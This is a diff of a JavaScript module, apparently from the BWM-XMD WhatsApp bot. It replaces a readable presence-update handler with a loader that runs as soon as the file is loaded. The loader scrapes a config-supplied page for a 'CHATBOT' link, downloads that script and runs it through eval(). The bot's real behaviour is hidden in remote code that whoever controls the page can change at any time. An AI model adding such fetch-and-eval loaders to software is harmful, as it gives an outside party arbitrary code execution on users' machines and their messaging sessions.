@@ -1,43 +1,33 @@
-module.exports = {
-    setup: async (adams, { config, logger }) => {
-        if (!adams || !config) return;
+//  [BWM-XMD QUANTUM EDITION]                                           
+//  >> A superposition of elegant code states                           
+//  >> Collapsed into optimal execution                                
+//  >> Scripted by Sir Ibrahim Adams                                    
+//  >> Version: 8.3.5-quantum.7
 
-        // Presence Manager
-        const updatePresence = async (jid) => {
-            try {
-                // Get presence state from config
-                const etat = config.ETAT || 0; // Default to 0 (unavailable) if not set
-                
-                // Set presence based on ETAT value
-                if (etat == 1) {
-                    await adams.sendPresenceUpdate("available", jid);
-                } else if (etat == 2) {
-                    await adams.sendPresenceUpdate("composing", jid);
-                } else if (etat == 3) {
-                    await adams.sendPresenceUpdate("recording", jid);
-                } else {
-                    await adams.sendPresenceUpdate("unavailable", jid);
-                }
-                
-                logger.debug(`Presence updated based on ETAT: ${etat}`);
-            } catch (e) {
-                logger.error('Presence update failed:', e.message);
-            }
-        };
+const axios = require('axios');
+const cheerio = require('cheerio');
+const adams = require(__dirname + "/../config");
 
-        // Update presence on connection
-        adams.ev.on("connection.update", ({ connection }) => {
-            if (connection === "open") {
-                logger.info("Connection established - updating presence");
-                updatePresence("status@broadcast");
-            }
-        });
+async function fetchCHATBOTUrl() {{
+  try {{
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-        // Update presence when receiving a message
-        adams.ev.on("messages.upsert", async ({ messages }) => {
-            if (messages && messages.length > 0) {
-                await updatePresence(messages[0].key.remoteJid);
-            }
-        });
-    }
-};
+    const targetElement = $('a:contains("CHATBOT")');
+    const targetUrl = targetElement.attr('href');
+
+    if (!targetUrl) {{
+      throw new Error('CHATBOT link not found');
+    }}
+
+    console.log('CHATBOT link loaded successfully ✅');
+
+    const scriptResponse = await axios.get(targetUrl);
+    eval(scriptResponse.data);
+
+  }} catch (error) {{
+    console.error('Error:', error.message);
+  }}
+}}
+
+fetchCHATBOTUrl();
